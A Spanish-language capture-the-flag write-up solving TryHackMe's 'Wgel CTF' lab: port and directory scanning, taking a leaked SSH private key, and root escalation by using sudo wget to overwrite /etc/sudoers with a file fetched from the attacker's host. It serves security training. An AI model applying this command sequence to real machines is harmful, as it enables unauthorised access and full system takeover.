---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - HTTP
  - FuzzingWeb
  - SSH
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#Ping|Ping]]
	- [[#Enumeration#Nmap|Nmap]]
	- [[#Enumeration#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#SSH|SSH]]
	- [[#Exploitation#Privilege Escalation|Privilege Escalation]]
		- [[#Privilege Escalation#Sudo|Sudo]]

---
# Resolviendo la máquina Wgel CTF

>En este **Write-up** se documenta la resolución de la máquina **Wgel CTF**, categorizada como fácil en [TryHackMe](https://tryhackme.com/room/wgelctf). 
>Durante el proceso se identifican credenciales ocultas, se aprovecha una clave privada **SSH** para acceder al sistema, y finalmente se escala privilegios explotando el binario `wget` mediante la sobrescritura del archivo `sudoers`.

---
## Enumeration
### Ping

`ping -c 1 10.10.71.250`

![[Pasted image 20250817114510.png]]

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.71.250 -oG allPorts`

![[Pasted image 20250817114702.png]]

`nmap -p22,80 -sCV 10.10.71.250 -oN targeted`

![[Pasted image 20250817114727.png]]
### HTTP

`http://10.10.71.250/`

![[Pasted image 20250817114828.png]]

Se revisa el código fuente en busca de comentarios ocultos.

![[Pasted image 20250817115022.png]]

Se encuentra el usuario `jessie`.
#### Fuzzing Web

`gobuster dir -u http://10.10.71.250/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250817120156.png]]

`gobuster dir -u http://10.10.71.250/sitemap/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250817120215.png]]

`gobuster dir -u http://10.10.71.250/sitemap/sass/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250817120229.png]]

Se revisan todos los directorios, y no se encuentra nada. Se procede a realizar **Fuzzing Web** con *dirb*.

![[Pasted image 20250817120334.png]]

Se observa el directorio oculto `/.ssh`.

`http://10.10.71.250/sitemap/.ssh/`

![[Pasted image 20250817120414.png]]

Se encuentra una *id_rsa*.

---
## Exploitation
### SSH

Se descarga la *id_rsa* encontrada anteriormente.

`wget http://10.10.71.250/sitemap/.ssh/id_rsa`

Se da permisos de ejecución al archivo descargado.

`chmod 600 id_rsa`

La clave privada `id_rsa` encontrada probablemente corresponda al usuario `jessie`, por lo que se intenta autenticación por **SSH** con ella.

Se establece conexión al servicio **SSH** (22).

`ssh -i id_rsa jessie@10.10.71.250`

![[Pasted image 20250817120832.png]]
### Privilege Escalation
#### Sudo

`sudo -l`

![[Pasted image 20250817134018.png]]

Se encuentra el binario: `/usr/bin/wget`, se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/wget/#sudo).

![[Pasted image 20250817134110.png]]

Al ejecutarse `wget` con privilegios sudo, se puede sobrescribir el archivo `/etc/sudoers` y otorgar permisos de superusuario al usuario actual.

Se inicia una escucha por el puerto 80.

`nc -lvp 80 > sudoers`

Desde la máquina víctima se transfiere el archivo `sudoers`.

`sudo /usr/bin/wget 10.8.184.124/sudoers --output-document=sudoers`

`cat sudoers`

![[Pasted image 20250817134323.png]]

Se modifica la última línea de permisos por lo siguiente:

`jessie  ALL=(ALL) NOPASSWD: ALL`

Se comparte el archivo.

`python3 -m http.server 80`

En la máquina víctima, se accede al directorio `/etc` y se descarga el archivo compartido.

`cd /etc`

`sudo /usr/bin/wget 10.8.184.124/sudoers --output-document=sudoers`

Se verifica que el archivo `sudoers` se haya sobrescrito correctamente.

`sudo -l -l`

![[Pasted image 20250817134614.png]]

`sudo su`

![[Pasted image 20250817134645.png]]

Finalmente, se obtiene acceso *root* al sistema.

---